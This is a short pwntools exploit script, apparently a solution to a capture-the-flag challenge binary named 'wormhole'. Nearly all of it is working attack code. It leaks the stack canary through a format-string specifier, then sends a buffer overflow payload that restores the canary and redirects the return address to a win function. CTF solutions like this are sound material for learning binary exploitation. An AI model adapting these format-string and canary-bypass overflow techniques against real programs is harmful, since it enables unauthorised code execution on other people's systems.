from pwn import *

e = ELF("./wormhole")
context.terminal = ["tmux","splitw","-h"]
p = gdb.debug(e.path,gdbscript= '''
              set emulate off''', env = {"flag":'MINUTEMAN{YOUWIN!}'}
)
print(p.recvuntil(b"?"))
p.sendline(b"%7$p\n") # canary leak
canary = int(p.recvuntil(b"C").strip()[:-1], 16)
print('canary', hex(canary))
p.clean()
payload = b"A"*8 # buf
payload += p64(canary) # canary
payload += b"B"*8 # rbp
payload += p64(e.symbols['wormhole']) # ret
payload += b'\0'
print(payload)
p.sendline(payload)

p.interactive()